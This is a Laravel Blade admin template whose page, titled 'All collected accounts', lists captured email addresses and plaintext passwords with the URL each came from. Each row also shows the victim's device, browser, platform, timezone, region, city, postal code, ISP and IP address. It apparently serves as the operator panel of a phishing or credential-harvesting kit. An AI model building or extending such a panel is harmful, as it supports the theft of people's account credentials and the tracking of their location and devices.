@extends('admin.admin_master')
@section('admin')
    <div class="page-content">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12">
                    <div class="card">
                        <div class="card-body">
                            <h4 class="card-title">All collected accounts</h4>
                            <table id="datatable" class="table table-bordered dt-responsive nowrap"
                                style="border-collapse: collapse; border-spacing: 0; width: 100%;">
                                <thead>
                                    <tr>
                                        <th>Sl.</th>
                                        <th>Email</th>
                                        <th>Password</th>
                                        <th>URL</th>
                                        <th>Device Name</th>
                                        <th>Browser Name</th>
                                        <th>Browser Version</th>
                                        <th>Platform</th>
                                        <th>Platform Version</th>
                                        <th>Timezone</th>
                                        <th>Region</th>
                                        <th>Country</th>
                                        <th>City</th>
                                        <th>Postal Code</th>
                                        <th>ISP</th>
                                        <th>IP Address</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    @foreach ($allAccounts as $account)
                                    <tr>
                                        <td>{{$loop->iteration}}</td>
                                        <td>{{$account->email}}</td>
                                        <td>{{$account->password}}</td>
                                        <td>{{$account->url}}</td>
                                        <td>{{$account->device_name}}</td>
                                        <td>{{$account->browser_name}}</td>
                                        <td>{{$account->browser_version}}</td>
                                        <td>{{$account->platform}}</td>
                                        <td>{{$account->platform_version}}</td>
                                        <td>{{$account->timezone}}</td>
                                        <td>{{$account->region}}</td>
                                        <td>{{$account->country}}</td>
                                        <td>{{$account->city}}</td>
                                        <td>{{$account->postal_code}}</td>
                                        <td>{{$account->isp}}</td>
                                        <td>{{$account->ip}}</td>
                                        <td>
                                        <a href="{{route('delete.account',$account->id)}}" class="btn btn-danger sm" id="delete" title="Delete Data"><i class="fas fa-trash-alt"></i></a>
                                        </td>
                                    </tr>
                                    @endforeach
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection
